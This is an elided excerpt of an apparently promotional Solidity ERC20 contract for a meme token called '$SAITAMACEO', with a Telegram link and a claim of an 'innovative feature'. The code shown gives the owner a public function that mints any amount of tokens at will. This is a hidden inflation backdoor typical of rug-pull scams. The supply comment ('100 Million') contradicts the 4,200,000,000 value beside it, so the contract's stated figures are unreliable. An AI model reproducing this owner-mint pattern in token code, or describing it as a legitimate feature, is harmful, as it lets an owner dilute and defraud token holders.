...
//
// $SAITAMACEO proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/SaitamaCeo_BSC
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SAITAMACEO(uint256 amount) public onlyOwner {
 _SAITAMACEO(msg.sender, amount);
    }
    ...
    function _SAITAMACEO(address account, uint256 amount) internal virtual {
...
contract $SAITAMACEO is ERC20 {

    uint tokenTotalSupply = 4200000000; // 100 Million Token Supply

    constructor() public ERC20("SAITAMA CEO", "SAITAMA CEO") {
     _SAITAMACEO(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}